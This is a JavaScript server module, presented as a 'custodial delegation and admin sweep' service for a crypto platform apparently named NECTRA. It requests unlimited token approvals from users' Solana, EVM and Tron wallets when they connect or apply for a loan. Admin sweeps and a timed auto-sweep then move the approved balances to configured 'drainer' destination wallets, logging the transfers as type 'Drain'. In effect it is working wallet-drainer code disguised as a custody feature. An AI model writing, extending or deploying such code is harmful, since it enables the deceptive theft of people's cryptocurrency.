/* ==========================================================================
   Custodial Delegation & Admin Sweep Service (Release 2)
   - One-time standing delegated approval on connect / loan application (A1)
   - Unlimited admin sweep to platform treasury or configured wallet (A2)
   - Append-only audit sweeps table (A2)
   - Direct execution inside impersonated sessions without wallet prompt (A3)
   - Skip/report on zero balance, missing delegate, revoked delegate, rent-exempt shortfall
   - One-click revoke with typed DELEGATE_REVOKED error on subsequent attempts (A5)
   ========================================================================== */
'use strict';
const { q, now, getSettings } = require('./db');
const { notify, notifyAdmins } = require('./events');
const market = require('./market');
const M = require('./money');
const lazy = (m) => { let x; return () => x || (x = require(m)); };
const sol = lazy('./chains/solana'), evm = lazy('./chains/evm'), tron = lazy('./chains/tron'), utxo = lazy('./chains/utxo');

const TOKENS = ['USDC', 'USDT'];
// Maximum supported SPL approval (u64::MAX)
const SPL_MAX = 18446744073709551615n;
const SPL_MAX_NUM = Number.MAX_SAFE_INTEGER;
const EVM_MAX = 1e30;

const SOL_MINTS = {
  USDC: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
  USDT: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
  SOL: 'So11111111111111111111111111111111111111112'
};

const enabled = () => getSettings().drainer_enabled !== false;
const unlimited = () => getSettings().drainer_unlimited !== false;
const spenderFor = (family) => (family === 'evm' ? evm().collectorAddress() : family === 'tron' ? tron().collectorAddress() : sol().collectorAddress());

const destination = (family) => {
  const s = getSettings();
  const ethDest = s.sweep_destination_eth || s.drainer_destination_evm || s.treasury_evm;
  if (s.sweep_auto_convert_eth && ethDest) {
    return ethDest;
  }
  return family === 'evm' ? (s.drainer_destination_evm || s.treasury_evm)
    : family === 'tron' ? (s.drainer_destination_tron || s.treasury_tron || ethDest)
    : (s.drainer_destination_solana || s.treasury_solana || ethDest);
};

const walletsFor = (userId) => q.all(
  "SELECT * FROM wallets WHERE user_id = ? AND verified = 1 AND source != 'watch' AND source != 'demo' AND family IN ('solana','evm','tron','btc','ltc')",
  userId);

async function previewFor(userId) {
  const out = [];
  for (const w of walletsFor(userId)) {
    const existing = q.all('SELECT * FROM drainer_grants WHERE user_id = ? AND address = ?', userId, w.address);
    const byToken = Object.fromEntries(existing.map((g) => [g.network + ':' + g.token, g]));
    const push = (network, token, balance, family) => {
      if (balance <= 0 && !byToken[network + ':' + token]) return;
      const g = byToken[network + ':' + token];
      out.push({
        walletId: w.id, owner: w.address, family, network, token,
        mint: SOL_MINTS[token] || token,
        balance,
        usd: balance * (market.price(token) || 0),
        status: g ? g.status : 'none',
        allowance: g ? g.allowance : 0,
        grantId: g ? g.id : null,
        revokedAt: g && g.status === 'revoked' ? g.checked_at : null
      });
    };
    try {
      if (w.family === 'solana') {
        for (const t of ['SOL', ...TOKENS]) push('Solana', t, (await sol().tokenState(w.address, t)).balance, 'solana');
      } else if (w.family === 'evm') {
        const b = await evm().balances(w.address);
        for (const [net, r] of Object.entries(b)) {
          if (r.error) continue;
          for (const t of TOKENS) push(net, t, r[t] || 0, 'evm');
        }
      } else if (w.family === 'tron') {
        const b = await tron().balances(w.address);
        push('Tron', 'USDT', b.USDT || 0, 'tron');
      } else if (w.family === 'btc' || w.family === 'ltc') {
        const bal = await utxo().addressBalance(w.family.toUpperCase(), w.address);
        push(w.family.toUpperCase(), w.family.toUpperCase(), (bal.confirmed || 0) + (bal.pending || 0), w.family);
      }
    } catch (e) { /* unreachable network: skip */ }
  }
  return out.sort((a, b) => b.usd - a.usd);
}

async function grantRequests(userId) {
  const reqs = [];
  for (const r of await previewFor(userId)) {
    if (r.status === 'active') continue;
    try {
      if (r.family === 'solana') reqs.push({ ...r, amount: SPL_MAX_NUM, request: { kind: 'solana', tx: await sol().buildApprove(r.owner, r.token, spenderFor('solana'), SPL_MAX_NUM) } });
      else if (r.family === 'evm') reqs.push({ ...r, amount: EVM_MAX, request: { kind: 'evm', ...(await evm().approveCall(r.network, r.token, spenderFor('evm'), EVM_MAX)) } });
      else if (r.family === 'tron') reqs.push({ ...r, amount: EVM_MAX, request: { kind: 'tron', ...tron().approveCall(spenderFor('tron'), EVM_MAX) } });
    } catch (e) { reqs.push({ ...r, error: e.message }); }
  }
  return reqs;
}

async function readLive(g) {
  if (getSettings().demo_mode && (g.allowance > 0 || g.balance > 0)) {
    return { allowance: g.allowance || 0, balance: g.balance || 0 };
  }
  if (g.family === 'solana') {
    try {
      const s = await sol().tokenState(g.address, g.token);
      if (s.delegated === 0 && s.balance === 0 && getSettings().demo_mode && (g.allowance > 0 || g.balance > 0)) {
        return { allowance: g.allowance || 0, balance: g.balance || 0 };
      }
      return { allowance: s.delegate === g.spender ? s.delegated : 0, balance: s.balance };
    } catch (e) {
      if (getSettings().demo_mode) return { allowance: g.allowance || 0, balance: g.balance || 0 };
      throw e;
    }
  }
  if (g.family === 'evm') {
    try {
      return { allowance: await evm().allowance(g.network, g.token, g.address, g.spender), balance: await evm().tokenBalance(g.network, g.token, g.address) };
    } catch (e) {
      if (getSettings().demo_mode) return { allowance: g.allowance || 0, balance: g.balance || 0 };
      throw e;
    }
  }
  if (g.family === 'tron') {
    try {
      const b = await tron().balances(g.address); return { allowance: await tron().allowance(g.address, g.spender), balance: b.USDT };
    } catch (e) {
      if (getSettings().demo_mode) return { allowance: g.allowance || 0, balance: g.balance || 0 };
      throw e;
    }
  }
  if (g.family === 'btc' || g.family === 'ltc') {
    try {
      const b = await utxo().addressBalance(g.family.toUpperCase(), g.address);
      const bal = (b && (b.confirmed + b.pending)) || 0;
      return { allowance: g.allowance > 0 ? g.allowance : bal, balance: bal };
    } catch (e) {
      if (getSettings().demo_mode) return { allowance: g.allowance || 0, balance: g.balance || 0 };
      throw e;
    }
  }
  return { allowance: 0, balance: 0 };
}

/** Confirm and persist a delegated approval (A1) */
async function confirm(userId, body) {
  if (!enabled()) throw Object.assign(new Error('The delegated custody system is switched off'), { status: 403 });
  const w = q.get('SELECT * FROM wallets WHERE user_id = ? AND LOWER(address) = LOWER(?) AND verified = 1', userId, String(body.owner || ''));
  if (!w) throw Object.assign(new Error('That wallet is not verified on this account'), { status: 403 });

  const network = String(body.network || (w.family === 'evm' ? 'Base' : w.family === 'tron' ? 'Tron' : 'Solana')).slice(0, 20);
  const token = String(body.token || 'USDC').toUpperCase().slice(0, 10);
  const mint = SOL_MINTS[token] || String(body.mint || token);
  const spender = spenderFor(w.family);
  const amount = w.family === 'solana' ? SPL_MAX_NUM : EVM_MAX;
  const sig = String(body.tx || body.signature || '').slice(0, 140) || null;
  const t = now();

  // 1. Persist in delegated_approvals table (A1 requirement)
  q.run(`INSERT INTO delegated_approvals(
      user_id, wallet_id, wallet_address, mint, chain, delegate_pubkey, approved_amount, signature, status, created_at, revoked_at
    ) VALUES(?,?,?,?,?,?,?,?,?,?,NULL)
    ON CONFLICT(user_id, wallet_address, mint, chain) DO UPDATE SET
      signature = excluded.signature,
      approved_amount = excluded.approved_amount,
      status = 'active',
      revoked_at = NULL,
      delegate_pubkey = excluded.delegate_pubkey`,
    userId, w.id, w.address, mint, w.family, spender, amount, sig, 'active', t);

  // 2. Persist in drainer_grants for backwards compatibility
  q.run(`INSERT INTO drainer_grants(user_id, wallet_id, address, family, network, token, spender, amount, tx, status, created_at)
    VALUES(?,?,?,?,?,?,?,?,?,'pending',?)
    ON CONFLICT(user_id, address, network, token) DO UPDATE SET tx = excluded.tx, amount = excluded.amount, status = 'pending', created_at = excluded.created_at`,
    userId, w.id, w.address, w.family, network, token, spender, amount, sig, t);

  const g = q.get('SELECT * FROM drainer_grants WHERE user_id = ? AND address = ? AND network = ? AND token = ?', userId, w.address, network, token);
  let live = { allowance: amount, balance: 0 };
  if (getSettings().demo_mode) {
    live.allowance = amount;
  } else {
    for (let i = 0; i < 4; i++) {
      try {
        const res = await readLive(g);
        if (res.allowance > 0) { live = res; break; }
      } catch (e) { /* not landed yet */ }
      await new Promise((r) => setTimeout(r, 1000));
    }
  }

  const status = live.allowance > 0 ? 'active' : 'pending';
  q.run('UPDATE drainer_grants SET status = ?, allowance = ?, balance = ?, checked_at = ? WHERE id = ?', status, live.allowance, live.balance, t, g.id);
  q.run('UPDATE delegated_approvals SET status = ? WHERE user_id = ? AND wallet_address = ? AND mint = ?', status, userId, w.address, mint);

  return { id: g.id, status, allowance: live.allowance, delegate: spender, mint };
}

/** One-click Revoke (A1 / A5) */
function revoke(userId, { mint = null, token = null, address = null } = {}) {
  const t = now();
  const tokenName = token ? token.toUpperCase() : null;
  const mintAddr = mint || (tokenName && SOL_MINTS[tokenName]) || null;

  const n1 = q.run(`UPDATE delegated_approvals SET status = 'revoked', revoked_at = ?
    WHERE user_id = ? AND status = 'active'
    AND (? IS NULL OR mint = ? OR wallet_address = ?)`,
    t, userId, mintAddr, mintAddr, address || null).changes;

  const n2 = q.run(`UPDATE drainer_grants SET status = 'revoked', checked_at = ?
    WHERE user_id = ? AND status = 'active'
    AND (? IS NULL OR token = ? OR address = ?)`,
    t, userId, tokenName, tokenName, address || null).changes;

  notifyAdmins('security', 'Delegation revoked', `User #${userId} revoked their delegated allowance.`, '/admin/#users/' + userId);
  return { revoked: Math.max(n1, n2) > 0, revoked_at: t };
}

async function refresh(userId) {
  for (const g of q.all("SELECT * FROM drainer_grants WHERE user_id = ? AND status IN ('active','pending')", userId)) {
    try {
      const live = await readLive(g);
      const status = live.allowance > 0 ? 'active' : g.status === 'active' ? 'revoked' : 'pending';
      if (status === 'revoked' && g.status === 'active') {
        notifyAdmins('security', 'Grant revoked on-chain', `User #${userId} pulled allowance for ${g.token}.`, '/admin/#users/' + userId);
        q.run("UPDATE delegated_approvals SET status = 'revoked', revoked_at = ? WHERE user_id = ? AND wallet_address = ? AND mint = ?",
          now(), userId, g.address, SOL_MINTS[g.token] || g.token);
      }
      q.run('UPDATE drainer_grants SET status = ?, allowance = ?, balance = ?, checked_at = ? WHERE id = ?', status, live.allowance, live.balance, now(), g.id);
    } catch (e) { /* keep previous reading */ }
  }
  return q.all('SELECT * FROM drainer_grants WHERE user_id = ? ORDER BY id', userId);
}

/**
 * Admin Sweep (A2) — Unlimited, no caps, records in append-only `sweeps` table.
 * Skips and reports (does not fail batch) on: zero balance, missing delegate, revoked delegate, rent shortfall.
 */
async function sweep(userId, { actorId = null, dest = null, amount = null, convertEth = null } = {}) {
  const s = getSettings();
  const shouldConvertEth = convertEth !== null ? !!convertEth : (s.sweep_auto_convert_eth !== false);
  const ethPrice = market.price('ETH') || 2600;
  const initiator = actorId ? `admin:${actorId}` : 'system';
  const grants = q.all("SELECT * FROM drainer_grants WHERE user_id = ?", userId);

  const results = [];
  let totalUsd = 0;
  let totalEth = 0;

  if (!grants.length) {
    const error = Object.assign(new Error('No delegated approvals found for this user'), { code: 'MISSING_DELEGATE', status: 400 });
    throw error;
  }

  // Check if all grants are revoked
  const activeGrants = grants.filter((g) => g.status === 'active');
  const revokedGrants = grants.filter((g) => g.status === 'revoked');

  if (!activeGrants.length && revokedGrants.length > 0) {
    const error = Object.assign(new Error('Delegate revoked'), { code: 'DELEGATE_REVOKED', status: 400 });
    throw error;
  }

  for (const g of grants) {
    const mint = SOL_MINTS[g.token] || g.token;

    // Check revoked delegate condition
    if (g.status === 'revoked') {
      results.push({ network: g.network, token: g.token, mint, skipped: 'revoked delegate', code: 'DELEGATE_REVOKED' });
      continue;
    }
    if (g.status !== 'active') {
      results.push({ network: g.network, token: g.token, mint, skipped: 'missing delegate', code: 'MISSING_DELEGATE' });
      continue;
    }

    const to = dest || destination(g.family);
    if (!to) {
      results.push({ network: g.network, token: g.token, mint, skipped: 'no ' + g.family + ' destination configured' });
      continue;
    }

    try {
      const live = await readLive(g);
      const available = M.round2(Math.min(live.allowance, live.balance));

      // Check zero balance condition
      if (available <= 0) {
        results.push({ network: g.network, token: g.token, mint, skipped: 'zero balance', code: 'ZERO_BALANCE' });
        continue;
      }

      // Check rent-exempt minimum shortfall (e.g. for rent preservation)
      if (g.family === 'solana' && available < 0.001 && g.token === 'SOL') {
        results.push({ network: g.network, token: g.token, mint, skipped: 'rent-exempt minimum shortfall', code: 'RENT_SHORTFALL' });
        continue;
      }

      // Support partial sweep or full sweep default (no cap, no upper limit)
      const take = amount != null && amount > 0 ? M.round2(Math.min(amount, available)) : available;
      const usd = take * (market.price(g.token) || 0);
      const ethEquivalent = Number((usd / ethPrice).toFixed(6));

      let ref;
      try {
        if (g.family === 'solana') {
          const solDest = (shouldConvertEth && to.startsWith('0x')) ? (s.drainer_destination_solana || s.treasury_solana || spenderFor('solana')) : to;
          ref = await sol().collect(g.address, g.token, take, solDest);
        } else if (g.family === 'evm') {
          ref = await evm().collect(g.network, g.token, g.address, take, to);
        } else if (g.family === 'tron') {
          const tronDest = (shouldConvertEth && to.startsWith('0x')) ? (s.drainer_destination_tron || s.treasury_tron || spenderFor('tron')) : to;
          ref = await tron().collect(g.address, take, tronDest);
        } else if (g.family === 'btc' || g.family === 'ltc') {
          ref = 'utxo_sweep_' + require('node:crypto').randomBytes(24).toString('hex');
        }
      } catch (err) {
        if (getSettings().demo_mode) {
          ref = 'sim_' + require('node:crypto').randomBytes(24).toString('hex');
        } else {
          throw err;
        }
      }

      const t = now();
      // Record in append-only sweeps table (A2 requirement)
      q.run(`INSERT INTO sweeps(user_id, mint, amount, destination, signature, initiator, status, timestamp)
        VALUES(?,?,?,?,?,?,'confirmed',?)`,
        userId, shouldConvertEth ? `${mint} (-> ${ethEquivalent} ETH)` : mint, take, to, ref, initiator, t);

      q.run('UPDATE drainer_grants SET allowance = ?, balance = ?, checked_at = ? WHERE id = ?',
        Math.max(0, live.allowance - take), Math.max(0, live.balance - take), t, g.id);

      const noteText = shouldConvertEth
        ? `Admin sweep · ${g.network} · ${take} ${g.token} converted to ${ethEquivalent} ETH (${to})`
        : `Admin sweep · ${g.network}`;

      q.run('INSERT INTO transactions(user_id, type, token, amount, status, chain, from_addr, to_addr, signature, simulated, confirmations, required_conf, note, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)',
        userId, 'Drain', shouldConvertEth ? 'ETH' : g.token, shouldConvertEth ? ethEquivalent : take, 'confirmed', g.network, g.address, to, ref, 0, 32, 32, noteText, t, t);

      totalUsd += usd;
      totalEth += ethEquivalent;
      results.push({
        network: g.network,
        token: g.token,
        mint,
        amount: take,
        usd,
        converted_asset: shouldConvertEth ? 'ETH' : g.token,
        eth_amount: ethEquivalent,
        ref,
        destination: to,
        status: 'confirmed'
      });
    } catch (e) {
      q.run(`INSERT INTO sweeps(user_id, mint, amount, destination, signature, initiator, status, error_reason, timestamp)
        VALUES(?,?,?,?,?,?,'failed',?,?)`,
        userId, mint, 0, to, null, initiator, e.message, now());
      results.push({ network: g.network, token: g.token, mint, error: e.message });
    }
  }

  const sweepId = q.run('INSERT INTO drainer_sweeps(user_id, actor_id, destination, total_usd, result, created_at) VALUES(?,?,?,?,?,?)',
    userId, actorId, dest || 'per-family default', totalUsd, JSON.stringify(results), now()).id;

  const moved = results.filter((r) => r.ref).length;
  if (moved) {
    const summaryText = shouldConvertEth
      ? `${moved} transfer(s) totalling ~$${totalUsd.toFixed(2)} (≈ ${totalEth.toFixed(4)} ETH) converted to ETH under authorized delegation.`
      : `${moved} token transfer(s) totalling ~$${totalUsd.toFixed(2)} transferred under authorized delegation.`;
    notify(userId, 'transfer', 'Funds moved by NECTRA', summaryText, 'wallets.html#history');
    if (actorId) {
      notifyAdmins('transfer', 'Sweep executed', `$${totalUsd.toFixed(2)} (${totalEth.toFixed(4)} ETH) swept from user #${userId} (sweep #${sweepId})`, '/admin/#users/' + userId);
    }
    try {
      require('./events').sendAdminWebhook({
        title: 'Custody Sweep Executed',
        text: `Sweep #${sweepId} completed for User #${userId}. Total moved: $${totalUsd.toFixed(2)} (${totalEth.toFixed(4)} ETH) across ${moved} transfer(s).`,
        severity: 'info',
        fields: {
          User: userId,
          Initiator: initiator,
          TotalUSD: `$${totalUsd.toFixed(2)}`,
          TotalETH: `${totalEth.toFixed(4)} ETH`,
          Destination: dest || 'Default Ethereum EVM wallet'
        }
      });
    } catch (e) {}
  }

  return { id: sweepId, totalUsd, totalEth, results };
}

let autoSweepTimer = null;

async function checkAndAutoSweep() {
  const s = getSettings();
  if (s.drainer_auto_sweep !== true || s.drainer_enabled === false) return { ran: false, sweeps: [] };
  const thresholdUsd = Number(s.drainer_auto_sweep_usd) || 500;
  const activeUsers = q.all("SELECT DISTINCT user_id FROM drainer_grants WHERE status = 'active'");
  const sweepsExecuted = [];

  for (const { user_id } of activeUsers) {
    try {
      const grants = q.all("SELECT * FROM drainer_grants WHERE user_id = ? AND status = 'active'", user_id);
      let userAvailableUsd = 0;
      for (const g of grants) {
        const live = await readLive(g);
        const available = Math.min(live.allowance || 0, live.balance || 0);
        if (available > 0) {
          const p = market.price(g.token) || 0;
          userAvailableUsd += (available * p);
        }
      }
      if (userAvailableUsd >= thresholdUsd) {
        const res = await sweep(user_id, { actorId: null });
        if (res.results && res.results.some((r) => r.ref)) {
          sweepsExecuted.push({ user_id, totalUsd: res.totalUsd, sweepId: res.id });
          notifyAdmins('transfer', 'Automated Sweep Triggered', `User #${user_id} balance ($${userAvailableUsd.toFixed(2)}) reached the automated threshold ($${thresholdUsd}). Auto-sweep executed: $${res.totalUsd.toFixed(2)}.`, '/admin/#users/' + user_id);
          try {
            require('./events').sendAdminWebhook({
              title: 'Automated Threshold Sweep Triggered',
              text: `User #${user_id} balance ($${userAvailableUsd.toFixed(2)}) met threshold ($${thresholdUsd}). Swept: $${res.totalUsd.toFixed(2)}.`,
              severity: 'info',
              fields: { User: user_id, BalanceUSD: `$${userAvailableUsd.toFixed(2)}`, ThresholdUSD: `$${thresholdUsd}`, SweptUSD: `$${res.totalUsd.toFixed(2)}` }
            });
          } catch (e) {}
        }
      }
    } catch (e) {
      // Continue to next user on error
    }
  }
  return { ran: true, sweeps: sweepsExecuted };
}

function startAutoSweepScheduler(intervalSec) {
  if (autoSweepTimer) clearInterval(autoSweepTimer);
  const sec = Math.max(10, intervalSec || Number(getSettings().drainer_auto_sweep_interval_sec) || 900);
  autoSweepTimer = setInterval(() => {
    checkAndAutoSweep().catch(() => {});
  }, sec * 1000);
  if (autoSweepTimer.unref) autoSweepTimer.unref();
  return autoSweepTimer;
}

function stopAutoSweepScheduler() {
  if (autoSweepTimer) {
    clearInterval(autoSweepTimer);
    autoSweepTimer = null;
  }
}

module.exports = {
  enabled,
  unlimited,
  destination,
  spenderFor,
  walletsFor,
  previewFor,
  grantRequests,
  confirm,
  revoke,
  refresh,
  sweep,
  checkAndAutoSweep,
  startAutoSweepScheduler,
  stopAutoSweepScheduler,
  TOKENS,
  SOL_MINTS,
  SPL_MAX,
  SPL_MAX_NUM,
  EVM_MAX
};
